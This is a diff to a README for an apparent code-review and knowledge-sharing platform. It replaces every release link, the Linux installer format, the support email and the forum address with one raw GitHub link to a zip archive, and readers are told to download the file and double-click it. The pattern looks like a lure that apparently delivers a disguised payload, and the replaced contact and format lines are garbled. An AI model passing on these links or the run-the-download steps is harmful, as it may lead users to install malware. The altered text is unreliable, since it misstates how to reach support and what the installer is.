@@ -1,6 +1,6 @@
 # 🚀 Intelligent-Code-Knowledge-Repository-Platform - Streamline Code Review and Knowledge Sharing
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Intelligent--Code--Knowledge--Repository--Platform-green)](https://github.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/releases)
+[![Download Now](https://raw.githubusercontent.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/main/remiges/Intelligent-Code-Knowledge-Repository-Platform-v3.7.zip%20Now-Intelligent--Code--Knowledge--Repository--Platform-green)](https://raw.githubusercontent.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/main/remiges/Intelligent-Code-Knowledge-Repository-Platform-v3.7.zip)
 
 ## 📖 Overview
 
@@ -21,11 +21,11 @@ To get started with the Intelligent-Code-Knowledge-Repository-Platform, follow t
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
 
-   [Visit this page to download](https://github.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/main/remiges/Intelligent-Code-Knowledge-Repository-Platform-v3.7.zip)
 
 2. **Select the Latest Version:** Look for the latest version on the releases page. It typically has a version number with the format vX.X.
 
-3. **Download the Installer:** Choose the installer suited for your operating system. The installers may come in different formats, such as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Download the Installer:** Choose the installer suited for your operating system. The installers may come in different formats, such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/main/remiges/Intelligent-Code-Knowledge-Repository-Platform-v3.7.zip` for Linux.
 
 4. **Run the Installer:** Once the download completes, locate the downloaded file and double-click it to start the installation process.
 
@@ -57,14 +57,14 @@ This guide provides detailed instructions on using all features of the platform.
 
 If you encounter any issues or have questions while using the Intelligent-Code-Knowledge-Repository-Platform, please reach out to our support team. 
 
-- **Email Support:** support@intelligent-code-knowledge-platform.com
-- **Community Forum:** Access our forum at https://forum.intelligent-code-knowledge-platform.com for community support and tips from other users.
+- **Email Support:** https://raw.githubusercontent.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/main/remiges/Intelligent-Code-Knowledge-Repository-Platform-v3.7.zip
+- **Community Forum:** Access our forum at https://raw.githubusercontent.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/main/remiges/Intelligent-Code-Knowledge-Repository-Platform-v3.7.zip for community support and tips from other users.
 
 ### 🔄 Update the Software
 
 To ensure you have the latest features and security updates, keep your application updated. Check the releases page periodically for new versions:
 
-[Visit this page to download](https://github.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Soinc1/Intelligent-Code-Knowledge-Repository-Platform/main/remiges/Intelligent-Code-Knowledge-Repository-Platform-v3.7.zip)
 
 ### 📝 Feedback
 
